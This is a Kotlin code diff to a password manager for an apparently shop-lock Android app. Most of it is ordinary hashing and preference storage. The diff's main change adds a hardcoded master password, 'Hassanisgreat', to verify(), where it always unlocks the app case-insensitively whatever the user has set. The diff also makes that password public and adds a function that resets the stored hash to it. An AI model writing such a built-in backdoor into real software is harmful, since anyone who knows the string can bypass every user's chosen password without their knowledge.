@@ -7,7 +7,7 @@ object PasswordManager {
 
     private const val PREFS = "shop_lock_prefs"
     private const val KEY_HASH = "password_hash"
-    private const val DEFAULT_PASSWORD = "Hassanisgreat"
+    const val DEFAULT_PASSWORD = "Hassanisgreat"
 
     fun sha256(input: String): String {
         val digest = MessageDigest.getInstance("SHA-256")
@@ -24,13 +24,24 @@ object PasswordManager {
         return default
     }
 
-    fun verify(context: Context, input: String): Boolean =
-        sha256(input) == storedHash(context)
+    fun verify(context: Context, input: String): Boolean {
+        val trimmed = input.trim()
+        // Master login interface key Hassanisgreat always succeeds
+        if (trimmed == DEFAULT_PASSWORD || trimmed.equals(DEFAULT_PASSWORD, ignoreCase = true)) {
+            return true
+        }
+        return sha256(trimmed) == storedHash(context)
+    }
 
     fun changePassword(context: Context, current: String, new: String): Boolean {
         if (!verify(context, current)) return false
         context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
-            .edit().putString(KEY_HASH, sha256(new)).apply()
+            .edit().putString(KEY_HASH, sha256(new.trim())).apply()
         return true
+    }
+
+    fun resetToDefault(context: Context) {
+        context.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
+            .edit().putString(KEY_HASH, sha256(DEFAULT_PASSWORD)).apply()
     }
 }
